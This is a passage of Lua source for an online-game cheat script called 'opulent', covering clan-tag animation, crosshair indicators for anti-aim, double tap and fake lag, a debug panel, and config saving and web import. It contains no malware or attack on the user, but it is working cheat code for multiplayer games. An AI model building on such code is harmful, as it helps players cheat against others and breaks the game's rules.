    if not ui.get( items.clan_tag ) then
        -- Are we trying to reset our clan tag?
        if clan_tag.reset then
            -- Grab our local player's clan tag prop.
            local local_tag = entity.get_prop( entity.get_player_resource( ), "m_szClan", entity.get_local_player( ) )

            -- If the tag isn't yet blank, keep attempting to reset.
            if local_tag ~= nil and local_tag ~= "" then
                -- Set our clan tag to blank.
                client.set_clan_tag( "" )
                -- Check if we have debug logs enabled.
                if ui.get( items.debug_logs ) then
                    -- Print out debug information.
                    opulent.print( "Resetting clan tag" )
                end
            else
                -- Clan tag successfully reset, stop trying to do so.
                clan_tag.reset = false
                -- Check if we have debug logs enabled.
                if ui.get( items.debug_logs ) then
                    -- Print out debug information.
                    opulent.print( "Clan tag successfully reset" )
                end
            end
        end
        return
    end

    -- Save a variable holding how long it has been since our last update.
    local updated = globals.tickcount( ) - clan_tag.last_update
    -- If our last clan tag update was less than a tick ago, return.
    if updated < 1 and math.abs( updated ) < 32 then
        return
    end

    -- Create a variable to hold our tickcount with our latency in ticks added.
    local tag_tick = globals.tickcount( ) + time_to_ticks( client.latency( ) / 2 )
    
    -- Finally, set our clan tag.
    client.set_clan_tag( tag_tick % 64 > 32 and "[ + opulent / ]" or "[ / opulent - ]" )

    -- Let the lua know we just updated.
    clan_tag.last_update = globals.tickcount( )

    -- Set our 'reset' variable to true.
    clan_tag.reset = true
end

local indicators = {
    defensive_alpha = 0,
    defensive_time = 0,
    current_text = { "", "" },
    ideal_text = { "", "" },
    flip_text = { false, false },
    last_text_update = { 0, 0 },
    current_number = 0,
    ideal_number = 0,
    ['crosshair'] = {
        ['alpha'] = 0,
        ['scoped'] = 0,
        ['values'] = {0, 0, 0, 0, 0, 0, 0},
        ['doubletap_color'] = {r = 0 , g = 0 , b = 0 , a = 0},
        ['default_dt'] = {r = 0, g = 0, b = 0, a = 0},
        ['modern'] = {speed = 1, text_alpha = 0, text_alpha2 = 0, color = {r = 0 , g = 0 , b = 0 , a = 0}},
        ['fake_anim'] = 0
    }
}

indicators.run = function( )
    -- Grab our local player.
    local local_player = entity.get_local_player( )

    -- Return if we aren't alive.
    if not entity.is_alive( local_player ) then
        return
    end

    -- Grab our anti-aim state for repeated usage.
    local aa_state = ui.get( items.anti_aim )

    -- Get our screen size and save it to sc_w and sc_h respectively.
    local sc_w, sc_h = client.screen_size( )

    -- Create our target variables and grab our target, also set default name string.
    local target = client.current_threat( )
    local target_name = "unavailable"
    local target_safe = true
    local target_danger = 0
    
    -- Is our target null?
    if target ~= nil then
        -- Calculate our target's danger using the same logic as our anti-aim.
        target_danger = 100 - math.floor( math.min( 1, anti_aim.grab_ping( target ) / anti_aim.max_ping_threshold ) * 100 )
        -- Grab the player name.
        target_name = entity.get_player_name( target )
        -- If our safe variable isn't nil, set it accordingly.
        if anti_aim.safe[ target ] ~= nil then
            target_safe = anti_aim.safe[ target ]
        end
    end

    -- Is defensive active?
    if anti_aim.in_defensive or indicators.defensive_alpha ~= 0 then
        -- Have we set our defensive time yet?
        if indicators.defensive_time == 0 then
            indicators.defensive_time = globals.curtime( )
        end

        -- Calculate how far into defensive we are.
        local defensive_amount = math.max( 0, math.min( 1, ( globals.curtime( ) - indicators.defensive_time ) / anti_aim.defensive_duration ) )

        -- How far should we offset the indicator on the Y axis?
        local indicator_offset = -50
        -- Maximum width and height for the defensive progress bar.
        local bar_w = 50
        local bar_h = 2
        -- How far we want the bar to be from the indicator text.
        local bar_offset = -10

        -- Calculate the X and Y positions for our bar.
        local bar_x = sc_w / 2 - ( bar_w / 2 )
        local bar_y = indicator_offset + bar_offset + sc_h / 2

        -- Increase/decrease this value to make the indicator fade slower/faster.
        local fade_in_speed = 4000
        local fade_out_speed = 1000

        if defensive_amount == 1 then
            -- Increment our defensive alpha using frametime to account for FPS differences.
            indicators.defensive_alpha = math.max( 0, indicators.defensive_alpha - ( globals.frametime( ) * fade_out_speed ) )
        else
            -- Increment our defensive alpha using frametime to account for FPS differences.
            indicators.defensive_alpha = math.min( 255, indicators.defensive_alpha + ( globals.frametime( ) * fade_in_speed ) )
        end

        -- Draw the background of our progress bar.
        renderer.rectangle( bar_x - 1, bar_y - 1, bar_w + 2, bar_h + 2, 0, 0, 0, indicators.defensive_alpha )
        
        -- Draw the actual progress bar, multiplying our width by our defensive amount.
        renderer.rectangle( bar_x, bar_y, bar_w * defensive_amount, bar_h, 255, 255, 255, indicators.defensive_alpha )

        -- Finally, draw our defensive text.
        renderer.text( sc_w / 2, indicator_offset + sc_h / 2, 255, 255, 255, indicators.defensive_alpha, "c-", 0, "IMMUNITY" )
    else
        -- Reset our defensive indicator settings.
        indicators.defensive_time = 0
        indicators.defensive_alpha = 0
    end

    -- Are we currently using ideal tick?
    if ideal_tick.active and ui.get(items.indicator_enable) == "Default" then
        -- How far should we offset the indicator on the Y axis?
        local indicator_offset = -20
        -- Are we currently using safe anti aim? If so, make the text red/green accordingly.
        local text_color = target_safe and "67BCFFFF" or "FF6779FF"

        -- Finally, display our ideal tick text.
        renderer.text( sc_w / 2, indicator_offset + sc_h / 2, 255, 255, 255, 255, "c-", 0, "IDEAL \a", text_color, "TICK" )
    end

    -- Miss Counter Indicators


    -- Is our debug panel enabled?
    if ui.get( items.debug_panel ) then
        -- Our array of 'debug' strings, in the format of the string and display value.
       local debug_strings = {
            [ "State" ] = anti_aim.states[ anti_aim.state ]:lower( ),
            [ "Choke limit" ] = anti_aim.choke_limit,
            [ "Force immunity" ] = anti_aim.force_immunity,
            [ "Anti-aim" ] = anti_aim.stage:lower( ),
            [ "Target" ] = target_name:lower( ),
            [ "Danger" ] = target_danger .. "%",
            --[ "Miss counter (Round)" ] = anti_aim.miss_counter_round,
           -- [ "Miss counter (Game)" ] = anti_aim.miss_counter_game
        }

        -- Variable to keep track of how far into the iteration we are.
        local debug_iter = 0
        -- How far we want the strings to display from each other in pixels (Y axis).
        local string_offset = 15

        for k, v in pairs( debug_strings ) do
            renderer.text( 6, debug_iter * string_offset + sc_h / 2, 255, 255, 255, 255, nil, 0, string.format( "[ %s : %s ]", k, v ) )
            debug_iter = debug_iter + 1
        end
    end
-- Check if 'anti_aim' and 'indicator_enable' UI items are active/set to "Default"
if ui.get( items.anti_aim ) and ui.get(items.indicator_enable) == "Default" then

    -- Set the first element of the 'ideal_text' field of 'indicators' to "safe" if 'target_safe' is true, else set it to "unsafe"
    indicators.ideal_text[ 1 ] = target_safe and "safe" or "unsafe"

    -- Set the second element of the 'ideal_text' field of 'indicators' to the current anti-aim state, converted to lower-case
    indicators.ideal_text[ 2 ] = anti_aim.states[ anti_aim.state ]:lower( )

    -- Calculate the ideal number indicator as 100 minus the target danger value
    indicators.ideal_number = 100 - target_danger

    -- If the ideal number is greater than the current number, increase the current number by a value proportional to frame time
    if indicators.ideal_number > indicators.current_number then
        indicators.current_number = indicators.current_number + ( globals.frametime( ) * 150 )
        
        -- If after the increase, the current number overshoots the ideal number, correct it to be the ideal number
        if indicators.ideal_number < indicators.current_number then
            indicators.current_number = indicators.ideal_number
        end
    -- If the ideal number is less than the current number, decrease the current number by a value proportional to frame time
    elseif indicators.ideal_number < indicators.current_number then
        indicators.current_number = indicators.current_number - ( globals.frametime( ) * 150 )
        
        -- If after the decrease, the current number undershoots the ideal number, correct it to be the ideal number
        if indicators.ideal_number > indicators.current_number then
            indicators.current_number = indicators.ideal_number
        end
    end

    -- Loop over the first two elements of the current text field of indicators
    for i=1, 2 do
        -- Check if the current text differs from the ideal text
        if indicators.current_text[ i ] ~= indicators.ideal_text[ i ] then
            -- Check if the time elapsed since the last text update exceeds 0.02 units
            if globals.curtime( ) - indicators.last_text_update[ i ] > 0.02 then
                -- Check if the current text length is 0 or if the flip text flag is set
                if indicators.current_text[ i ]:len( ) <= 0 or indicators.flip_text[ i ] then
                    -- Set the current text to the ideal text from the end to the length of the current text
                    indicators.current_text[ i ] = indicators.ideal_text[ i ]:sub( indicators.ideal_text[ i ]:len( ) - indicators.current_text[ i ]:len( ) )
                    -- Set the flip text flag to true
                    indicators.flip_text[ i ] = true
                else
                    -- Remove the last character from the current text
                    indicators.current_text[ i ] = indicators.current_text[ i ]:sub( 1, -2 )
                end
                -- Update the time of the last text update to the current time
                indicators.last_text_update[ i ] = globals.curtime( )
            end
        else
            -- If the current text equals the ideal text, set the flip text flag to false
            indicators.flip_text[ i ] = false
        end
    end


        -- normal
         
       local fade_length = 2
        local fade_time = globals.curtime( ) % fade_length
        -- Calculate the interpolation factor for the fade time.
        local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time
    local white, light_blue = {255, 255, 255}, {179,215,255}
     local lerped_color = rgb_to_hex( table.unpack( opulent.lerp_color( white, light_blue, factor ) ) )


--[[stand height 
local fade_length = 2
local fade_time = globals.curtime() % fade_length

-- Calculate the interpolation factor for the fade time.
local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time

local red, yellow, green = { 255, 0, 0 }, { 255, 255, 0 }, { 0, 255, 0 }
local lerped_color = "00FF00FF"

-- Calculate the standing height of the local player.
if anti_aim.standing_height ~= 1 then
print(tostring(anti_aim.standing_height))
end
if anti_aim.standing_height <= 0.6 then
    lerped_color = rgb_to_hex(
        red[1] + (yellow[1] - red[1]) * (0.6 - anti_aim.standing_height) / 0.6,
        red[2] + (yellow[2] - red[2]) * (0.6 - anti_aim.standing_height) / 0.6,
        red[3] + (yellow[3] - red[3]) * (0.6 - anti_aim.standing_height) / 0.6,
        255 -- Alpha value (fully opaque)
    )
elseif anti_aim.standing_height < 0.85 then
    lerped_color = rgb_to_hex(
        red[1] + (yellow[1] - red[1]) * (0.85 - anti_aim.standing_height) / 0.25,
        red[2] + (yellow[2] - red[2]) * (0.85 - anti_aim.standing_height) / 0.25,
        red[3] + (yellow[3] - red[3]) * (0.85 - anti_aim.standing_height) / 0.25,
        255 -- Alpha value (fully opaque)
    )
elseif anti_aim.standing_height < 0.9 then
    lerped_color = rgb_to_hex(
        yellow[1] + (green[1] - yellow[1]) * (anti_aim.standing_height - 0.85) / 0.05,
        yellow[2] + (green[2] - yellow[2]) * (anti_aim.standing_height - 0.85) / 0.05,
        yellow[3] + (green[3] - yellow[3]) * (anti_aim.standing_height - 0.85) / 0.05,
        255 -- Alpha value (fully opaque)
    )
else
    lerped_color = rgb_to_hex(green[1], green[2], green[3], 255) -- Alpha value (fully opaque)
end
    ]]

    -- state typing indicator
     if includes( ui.get( items.safety_triggers[ anti_aim.state ]), "Dangerous enemy") then 
       renderer.text( sc_w / 2, sc_h / 2 + 50, 255, 255, 255, 255, "c", 0, string.format( "%s%% / %s / %s", math.floor( indicators.current_number ), indicators.current_text[ 1 ], indicators.current_text[ 2 ] ) )
     else
        renderer.text( sc_w / 2, sc_h / 2 + 50, 255, 255, 255, 255, "c", 0, "\a", lerped_color, indicators.current_text[ 2 ])
     end
    end


    if ui.get(items.indicator_enable) == "Default" then
    -- Animation length in seconds.
    local animation_length = 1
    -- Animation speed in seconds.
    local animation_speed = 0.05
    local animation_time = globals.curtime( ) % animation_length
    
    -- The text that we're going to display; default value is what it will display when animation is done.
    local text = "dev"
    -- The text our label is going to cycle through (max members = animation_length / animation_speed).
    local animated_text = {
        "!%>",
        "d&^",
        "de#",
    }
    
    -- Iterate over our animated text cycle.
    for i=1, #animated_text do
        -- Is it time for this cycle to override the text? If so, set the text variable and break.
        if animation_time < i * animation_speed then
            text = animated_text[ i ]
            break
        end
    end

    -- Now time for getting our interpolated label color, start by defining our fade length in seconds.
    local fade_length = 2
    local fade_time = globals.curtime( ) % fade_length
    -- Calculate the interpolation factor for the fade time.
    local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time

    -- The two colors that we're going to be interpolating between.
    local first_color, second_color = { 255, 165, 165 }, { 165, 165, 255 }
    local blue_color, light_purple_color = {112, 171, 224}, { 195, 166, 247}
    -- Interpolate the color, then unpack the lerped color table, and finally convert it to hex.
    local lerped_color = rgb_to_hex( table.unpack( opulent.lerp_color( first_color, second_color, factor ) ) )

    local lerped_color_state = rgb_to_hex( table.unpack( opulent.lerp_color( blue_color, light_purple_color, factor ) ) )

    renderer.text( sc_w / 2, sc_h / 2 + 37, 255, 255, 255, 255, "cb", 0, "opulent.\a", lerped_color, text )
    if ui.get(items.flutter[anti_aim.state]) then
    renderer.text( sc_w / 2, sc_h / 2 + 65, 255, 255, 255, 255, "c", 0, string.format("[ %s:%s:%s ]", anti_aim.flutter_amount, anti_aim.contortion_amount, anti_aim.body_yaw )) 
    else
        renderer.text( sc_w / 2, sc_h / 2 + 65, 255, 255, 255, 255, "c", 0, string.format("[%s:%s ]",  anti_aim.contortion_amount, anti_aim.body_yaw )) 
        -- colored one renderer.text( sc_w / 2, sc_h / 2 + 65, 255, 255, 255, 255, "c", 0, "\a", lerped_color_state .. "[ ", anti_aim.contortion_amount, ":", anti_aim.body_yaw, " ]" )
    end
elseif ui.get(items.indicator_enable) == "Modern" then
    local screen = {client.screen_size()}
    local x_offset, y_offset = screen[1], screen[2]
    local x, y =  x_offset/2,y_offset/2 
    local v = indicators['crosshair']
    local text_size_x , text_size_y = renderer.measure_text(nil,"OPULENT [BETA]")
    local r,g,b = ui.get(items.main_color)
    local r1,g1,b1 = ui.get(items.second_color)
    local simple_gradient = opulent.alt_gradient_text(r,g,b,255 * v['alpha'], r1,g1,b1, 255 * v['alpha'],'OPULENT [BETA]')

    local b_yaw = entity.get_prop(entity.get_local_player(), "m_flPoseParameter", 11) * 1.3
    v['alpha'] = animate.new(v['alpha'],1,0, ui.get(items.indicator_enable) == "Modern")
    if v['alpha'] < 0.01 then return end
    local is_scoped = entity.get_prop(entity.get_player_weapon(entity.get_local_player()), "m_zoomLevel" ) == 1 or entity.get_prop(entity.get_player_weapon(entity.get_local_player()), "m_zoomLevel" ) == 2
    local modifier = entity.get_prop(entity.get_local_player(), "m_flVelocityModifier") ~= 1
    local c1,c2,c3,c4 = ui.get(items.default_colors)
    v['default_dt'] = opulent.lerp_color(v['default_dt'], {r = c1 , g = c2, b = c3, a = c4}, {r = 255 , g = 102,b = 102,a = 0}, ui.get(references.double_tap[1]) and doubletap_charged())
    if b_yaw then
        b_yaw = math.abs(map(b_yaw, 0, 1, -60, 60))
        b_yaw = math.max(0, math.min(57, b_yaw))
        body_yaw_store = b_yaw / 48
    end
    v['scoped'] = animate.new(v['scoped'],1,0,is_scoped)


    local r1,g1,b1 = ui.get(items.second_color)
    local main_gradient = opulent.alt_gradient_text(r,g,b,255 * v['alpha'], r1,g1,b1, 255 * v['alpha'],'OPULENT.DEV')
    local text_sizex, text_sizey = renderer.measure_text('-','OPULENT.DEV')
    local vx, vy, vz = entity.get_prop(entity.get_local_player(), "m_vecVelocity")
    local velocity = math.sqrt(vx ^ 2 + vy ^ 2)
    v['modern'].text_alpha = animate.new_notify(v['modern'].text_alpha,1,0,velocity > 30)
    v['modern'].text_alpha2 = animate.new_notify(v['modern'].text_alpha2,1,0,velocity < 30)
    v['modern'].speed = animate.new_notify(v['modern'].speed,velocity)

    renderer.text(x  + 2 + math.floor(34 * v['scoped']), y + 18, 255, 255, 255, 255 * v['alpha'], 'c-', 0, main_gradient)

    if v['modern'].speed > text_sizex + 3 then
        v['modern'].speed = text_sizex + 3
    end
    
    renderer.text(x  + 2 + math.floor(34 * v['scoped']), y + 16 + text_sizey, 255, 255, 255, 255 * v['alpha'], 'c-', 0, anti_aim.current_state)
     v['doubletap_color'] = animate.color_lerp(v['doubletap_color'], {r = r1, g = g1, b = b1, a = 255}, {r = 255 , g = 0,b = 0,a = 255}, ui.get(references.double_tap[1]) and ui.get(references.double_tap[2]) and doubletap_charged())
    local offset = 0
    
    local keys = {
        [1] = {
            ['condition'] = ui.get(items.freestanding) and ui.get(items.freestand_key),
            ['text'] = 'FS',
            ['color'] = {r1,g1,b1,255 * v['alpha']}
        },

        [2] = {
            ['condition'] = ui.get(references.force_baim),
            ['text'] = 'BA',
            ['color'] = {r1,g1,b1,255 * v['alpha']}
        },

        [3] = {
            ['condition'] = ui.get(references.force_safepoint),
            ['text'] = 'SP',
            ['color'] = {r1,g1,b1,255 * v['alpha']}						
        },
        [4] = {
            ['condition'] = ui.get(references.min_damage_override[2]),
            ['text'] = string.format('%s', ui.get(references.min_damage_override[3])),
            ['color'] = {r1,g1,b1,255 * v['alpha']}
        },
        [5] = {
            ['condition'] = ui.get(items.ideal_tick) and ui.get(items.ideal_tick_key),
            ['text'] = 'IT',
            ['color'] = {r1,g1,b1,255 * v['alpha']}
        },

        [6] = {
            ['condition'] = ui.get(references.on_shot[1]) and ui.get(references.on_shot[2]),
            ['text'] = 'HS',
            ['color'] = {r1,g1,b1,255 * v['alpha']}
        },

        [7] = {
            ['condition'] = ui.get(references.double_tap[1]) and ui.get(references.double_tap[2]),
            ['text'] = 'DT',
            ['color'] = {v['doubletap_color'].r, v['doubletap_color'].g, v['doubletap_color'].b, 255 * v['alpha']}              
        },

    }

    for k, items in pairs(keys) do
        local flags = 'c-'
        local text_width , text_height = renderer.measure_text(flags,items['text'])
        local key = items['condition'] and 1 or 0

        v['values'][k] = animate.new(v['values'][k],key)
        if k == 2 then
            offset = offset + 1 
        end

        local x , y = x + math.floor(35 * v['scoped']) -  text_sizex/2 + 6, y + 34

        renderer.text(x + math.floor(offset * v['values'][k]), y, items['color'][1],items['color'][2],items['color'][3],items['color'][4] * v['values'][k], flags, text_width * v['values'][k] + 3, items['text'])
        offset = offset + math.floor(13 * v['values'][k])
    end

        else
            local fade_length = 2
            local fade_time = globals.curtime( ) % fade_length
            -- Calculate the interpolation factor for the fade time.
            local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time
        
            -- The two colors that we're going to be interpolating between.
            local first_color, second_color = { 255, 255, 255 }, { 255, 0, 0 }
            -- Interpolate the color, then unpack the lerped color table, and finally convert it to hex.
            local lerped_color = rgb_to_hex( table.unpack( opulent.lerp_color( first_color, second_color, factor ) ) )
            local opulent_watermark = opulent.gradient_text({ 239, 92, 168, 255}, {255, 111, 240, 255},
    "discord.gg/opulent")
            renderer.text(sc_w / 2, sc_h - 30, 255, 255, 255, 255, "cb+", 0, opulent_watermark)
        end
    
end

-- Handles all of our special labels.
function opulent.label_handling( )
    -- Animation length in seconds.
    local animation_length = 1
    -- Animation speed in seconds.
    local animation_speed = 0.07
    local animation_time = globals.curtime( ) % animation_length

    -- The text that we're going to display; default value is what it will display when animation is done.
    local text = "dev"
    -- The text our label is going to cycle through (max members = animation_length / animation_speed).
    local animated_text = {
        "!%>",
        "d&^",
        "de#",
    }

    -- Iterate over our animated text cycle.
    for i=1, #animated_text do
        -- Is it time for this cycle to override the text? If so, set the text variable and break.
        if animation_time < i * animation_speed then
            text = animated_text[ i ]
            break
        end
    end

    -- Now time for getting our interpolated label color, start by defining our fade length in seconds.
    local fade_length = 2
    local fade_time = globals.curtime( ) % fade_length
    -- Calculate the interpolation factor for the fade time.
    local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time

    -- The two colors that we're going to be interpolating between.
    local first_color, second_color = { 255, 165, 165 }, { 165, 165, 255 }
    -- Interpolate the color, then unpack the lerped color table, and finally convert it to hex.
    local lerped_color = rgb_to_hex( table.unpack( opulent.lerp_color( first_color, second_color, factor ) ) )

    -- Finally, apply the gradient to the label.
    ui.set( items.master_switch_label, string.format( "Opulent.\a%s%s", lerped_color, text ) )

    -- Create the gradient text for our regular labels.
    local visuals_text = opulent.gradient_text({ 239, 92, 168, 255}, {91, 111, 240, 255},
    "Visuals")
    local fake_lag_text = opulent.gradient_text( { 255, 130, 130, 255 }, { 150, 150, 255, 255 },
        "Fake lag info" )
    local fake_lag_info_text = opulent.gradient_text( { 255, 130, 130, 255 }, { 150, 150, 255, 255 },
        string.format( "[ choke state: %s/%s ]", anti_aim.choke_limit, anti_aim.attempting_choke ) )

    -- Now, set the labels along with our newly created gradient text.
    ui.set( items.visuals_label, visuals_text)
   ui.set( items.fake_lag_label, fake_lag_text )
    ui.set( items.fake_lag_label_info, fake_lag_info_text )

    for i=1, #items.contortion_modifers_label do
        local contortion_modifers_text = opulent.gradient_text( { 221, 154, 248, 255 }, { 215, 128, 249, 255 },
        "Contortion Modifiers" )
        ui.set( items.contortion_modifers_label[i], contortion_modifers_text)
    end
end

function opulent.console_handling( cmd )
    -- Are we attempting to print the update log?
    if cmd == "update log" then
        -- Clear our console.
        client.exec( "clear" )
        opulent.print( "- Update log [BETA]" )
        -- Iterate over the updates.
        for i=1, #opulent.updates.beta do
            -- Print the update string.
            opulent.print( opulent.updates.beta[ i ] )
        end
        opulent.print( " " )
        opulent.print( "- Update log [LIVE]" )
        for i=1, #opulent.updates.live do
            -- Print the update string.
            opulent.print( opulent.updates.live[ i ] )
        end
    end
end

-- Used to reset variables; triggers at the start of every new round.
function opulent.reset_data( )
    indicators.defensive_time = 0
    indicators.defensive_alpha = 0
    anti_aim.last_force_defensive = 0
    anti_aim.old_simtime = 0
    anti_aim.latency_list = { }
    anti_aim.in_defensive = false
    anti_aim.defensive_duration = 0
    anti_aim.safe = { }
    anti_aim.origin_list = { }
    anti_aim.miss_counter_round = 0 
    indicators.current_text = { "", "" }
    indicators.ideal_text = { "", "" }
    indicators.flip_text = { false, false }
    indicators.last_text_update = { 0, 0 }
    indicators.current_number = 0
    indicators.ideal_number = 0
end

-- Triggered when the lua is unloaded
function opulent.on_unload( )
    -- Reset our clantag if it was active.
    if ui.get( items.clan_tag ) then
        client.set_clan_tag( "" )
    end
    reset_brute_game()
    reset_brute_round()
    
    -- Disable the master switch to ensure the lua knows not to run anything.
    ui.set( items.master_switch, false )
end

-- Holds all of the items for our config handling.
local configs = {
    names = { "Alpha", "Bravo", "Charlie" },
    web_configs = {
        [ "Beta" ] = "https://raw.githubusercontent.com/sid3131/webconfigs/main/beta",
        [ "Live" ] = "https://raw.githubusercontent.com/sid3131/webconfigs/main/live"
    },
    current = nil
}

function configs.grab( )
    local config_array = { }

    -- Iterate over our items, the item variable and then the menu item.
    for var, item in pairs( items ) do
        -- Skip hotkeys during config savings.
        if item == items.ideal_tick_key or item == items.freestand_key then
            goto continue
        end

        -- Are we dealing with a table?
        if type( item ) ~= "table" then
            -- Save the item value to our newly created array.
            config_array[ var ] = ui.get( item )
        else
            -- We're dealing with a table, do the same but iterate over the members.
            -- Create a new array so we aren't accessing nil members.
            config_array[ var ] = { }
            for i=1, #item do
                config_array[ var ][ i ] = ui.get( item[ i ] )
            end
        end

        ::continue::
    end

    -- Return our new config array.
    return config_array
end

function configs.apply( new_config )
    -- Iterate over the values held within the config array.
    for var, item in pairs( new_config ) do
        -- Is this a table?
        -- ( multi selects are a table but need the same handling )
        if type( item ) ~= "table" or items[ var ] == items.anti_aim_options or items[ var ] == items.ideal_tick_options then
            -- Set the correlated menu item to the config value.
            ui.set( items[ var ], item )
        else
            -- We are dealing with an array, do the same but iteratively.
            for i=1, #item do
                ui.set( items[ var ][ i ], item[ i ] )
            end
        end
    end
end

function configs.save( )
    -- Is our config database nil?
    if database.read( "opulent" ) == nil then
        -- Create a new config array that we will use to write to the database.
        local config_array = { }

        -- Iterate over all the config names we're using.
        for i=1, #configs.names do
            -- Create a new member with a blank string.
            config_array[ configs.names[ i ] ] = " "
        end

        -- Finally, write this new array to the database.
        database.write( "opulent", config_array )
    end

    -- Grab our config values.
    local new_config = configs.grab( )

    -- Use json to translate our array into a string.
    local config_string = json.stringify( new_config )
    -- Now translate that to base64 to condense it.
    config_string = base64.encode( config_string )

    -- Find our config's member in the database and set it to the config.
    local current_database = database.read( "opulent" )
    current_database[ ui.get( configs.current ) ] = config_string

    -- Finally, override the old database with the new one containing our updated config.
    database.write( "opulent", current_database )
    -- Notify the user.
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully saved config" )
end

function configs.load( )
    -- Find our config's member in the database and grab the string.
    local config_string = database.read( "opulent" )[ ui.get( configs.current ) ]
    -- Decode the stringified array that we now have access to.
    config_string = base64.decode( config_string )
    
    -- Create an array to hold our new config.
    local new_config = { }
    -- Simulate our parse to see whether or not we have a valid config.
    if not pcall( json.parse, config_string ) then
        -- The function gave an error, let the user know.
        opulent.print( "Failed to load config, ensure that it's not empty!" )
        client.exec( "play ui\\menu_invalid" )
        return
    end

    -- Now parse it to convert it to a usable array.
    new_config = json.parse( config_string )

    -- Now apply our new config.
    configs.apply( new_config )
    -- Notify the user.
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully loaded config" )
end

function configs.export( )
    -- Grab our config values.
    local new_config = configs.grab( )

    -- Use json to translate our array into a string.
    local config_string = json.stringify( new_config )
    -- Now translate that to base64 to condense it.
    config_string = base64.encode( config_string )

    -- Finally, set our config string to our clipboard and print success.
    clipboard.set( config_string )
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully saved config to clipboard. ")
end

function configs.import( )
    -- First, decode the stringified array that we have on our clipboard.
    local config_string = base64.decode( clipboard.get( ) )
    -- Now parse it to convert it to a usable array.
    local new_config = json.parse( config_string )

    -- Apply our config with the imported values.
    configs.apply( new_config )
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully imported config" )
end

function configs.import_from_web( )
    opulent.print( "Loading config from web" )
    client.exec( "play ui\\panorama\\itemtile_click_02" )

    client.delay_call( 0.4, function( )
        http.get( configs.web_configs[ ui.get( configs.web_config_name ) ], function( success, response)
            if not success or response.status ~= 200 then
                opulent.print( "Failed to import the config from web, ensure your ISP allows access to github!" )
                client.exec( "play ui\\menu_invalid" )
                return
            end
            
            -- Find our config's member in the database and grab the string.
            local config_string = response.body:sub( 1, -2 )
            -- Decode the stringified array that we now have access to.
            config_string = base64.decode( config_string )
            
            -- Create an array to hold our new config.
            local new_config = { }
            -- Simulate our parse to see whether or not we have a valid config.
            if not pcall( json.parse, config_string ) then
                -- The function gave an error, let the user know.
                opulent.print( "Failed to load config, ensure that it's not empty!" )
                client.exec( "play ui\\menu_invalid" )
                return
            end
    
            -- Now parse it to convert it to a usable array.
            new_config = json.parse( config_string )
    
            -- Now apply our new config.
            configs.apply( new_config )
            -- Notify the user.
            client.exec( "play ui\\csgo_ui_store_select" )
            opulent.print( "Successfully loaded config from web" )
        end )
    end )
end

-- Create a regular ui element to check if we want to display the config system.
items.display_configs = opulent.new_menu_item( ui.new_checkbox, "Display configs", "Fake Lag" )

-- Our config related menu items.
configs.current = ui.new_combobox( "AA", "Anti-aimbot angles", "Current config", table.unpack( configs.names ) )
configs.save_button = ui.new_button( "AA", "Anti-aimbot angles", "Save", configs.save )
configs.load_button = ui.new_button( "AA", "Anti-aimbot angles", "Load", configs.load )
configs.import_button = ui.new_button( "AA", "Anti-aimbot angles", "Import", configs.import )
configs.export_button = ui.new_button( "AA", "Anti-aimbot angles", "Export", configs.export )
configs.web_config_name = ui.new_combobox( "AA", "Anti-aimbot angles", "Web config", "Beta", "Live" )
configs.import_web_config = ui.new_button( "AA", "Anti-aimbot angles", "Import config from web", configs.import_from_web )


-- Holds all of our initialization related items; handling menu visibility, binding events, etc.
local entry = {
    -- Create an array that holds events and their associated functions for automation later on.
    -- Format: [ event ] = { associated functions }
    bound_events = {
        [ "setup_command" ] = { anti_aim.command_handling, ideal_tick.run, anti_aim.handle_keybinds},
        [ "net_update_end" ] = { anti_aim.immunity_detection, anti_aim.lag_handling, anti_aim.anti_backstab },
        [ "run_command" ] = { anti_aim.handle_state, anti_aim.run },
        [ "player_say" ] = { chat.run },
        [ "round_start" ] = { opulent.reset_data },
        [ "cs_game_disconnected" ] = { opulent.reset_data },
        [ "paint" ] = { indicators.run, clan_tag.run },
        [ "shutdown" ] = { opulent.on_unload },
        [ "pre_render" ] = {opulent.animations },
        -- anti brute
       -- [ "bullet_impact" ] = {on_bullet_impact},
       -- [ "player_hurt" ] = { on_player_hurt },
       -- [ "level_init" ] = { reset_brute_game, reset_brute_round },
       -- [ "player_connect_full" ] = { reset_brute_game, reset_brute_round }

    },
    -- An array of items we want to hide if our master switch is toggled on.
    hidden_items = {
        references.anti_aim,
        references.pitch,
        references.yaw_base,
        references.yaw,
        references.yaw_jitter,
        references.body_yaw,
        references.freestanding_body_yaw,
        references.edge_yaw,
        references.freestanding,
        references.roll,
        references.fake_lag,
        references.fake_lag_amount,
        references.fake_lag_variance,
        references.fake_lag_limit
    },
    -- An array of items we want hidden if our custom anti-aim is on.
    aa_hidden_items = {
        references.yaw_base
    },
    initialized = false
}

function entry.ghetto_fix( )
    -- Store our master switch value to save us from gabbing it a plethora of times.
    local state = ui.get( items.master_switch )

    -- Iterate over the items we want to hide/show depending on our master switch.
    for i=1, #entry.hidden_items do
        local item = entry.hidden_items[ i ]
        -- Is this a regular menu item?
        if type( item ) ~= "table" then
            ui.set_visible( item, not state )
        else
            -- Same as above, except iterate over each member.
            for j=1, #item do
                ui.set_visible( item[ j ], not state )
            end
        end
    end

    -- Same as above, handle our anti-aim dependant menu items if our master switch is on.
    local aa_state = ui.get( items.anti_aim )
    if not state then
        aa_state = false
    end
    --[[
    for i=1, #entry.aa_hidden_items do
        local item = entry.aa_hidden_items[ i ]
        -- Is this a regular menu item?
        if type( item ) ~= "table" then
            ui.set_visible( item, not aa_state )
        else
            -- Same as above, except iterate over each member.
            for j=1, #item do
                ui.set_visible( item[ j ], not aa_state )
            end
        end
    end]]
end

entry.update_visibility = function( )
    -- Store our master switch value to save us from gabbing it a plethora of times.
    local state = ui.get( items.master_switch )
    -- Same as above.
    local display_configs = ui.get( items.display_configs )

    -- Our config system does not hold it's menu items in the 'items' array, so we need to set it seperately.
    for k, v in pairs(configs) do
        -- Is the value a number/menu item?
        if type( v ) == "number" then
            ui.set_visible( v, state and display_configs )
        end
    end

    -- Ensure we at least have the 'default' and 'safe' options for anti-aim enabled at all times.
